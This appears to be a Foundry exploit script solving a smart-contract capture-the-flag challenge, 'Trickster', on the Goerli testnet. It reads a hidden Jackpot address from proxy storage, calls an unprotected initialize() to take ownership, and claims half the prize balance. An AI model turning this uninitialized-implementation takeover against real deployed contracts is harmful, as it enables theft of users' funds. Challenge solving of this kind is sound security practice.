// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "../src/ChallengeTrickster.sol";

// https://goerli.etherscan.io/address/0xD120B01F840FECe3f2dADFb6565DB5Dd77cd36D7
contract ChallengeTricksterScript is Script {
    address constant instance = 0xD120B01F840FECe3f2dADFb6565DB5Dd77cd36D7;

    function run() public {
        vm.startBroadcast();

        address jackpotAddress = address(uint160(uint256(vm.load(instance, bytes32(uint256(1))))));
        console.log("jackpot", jackpotAddress);

        Jackpot jackpot = Jackpot(payable(jackpotAddress));
        jackpot.initialize(msg.sender);
        jackpot.claimPrize(jackpotAddress.balance / 2);

        console.log("balance", JackpotProxy(payable(instance)).balance());
    }
}
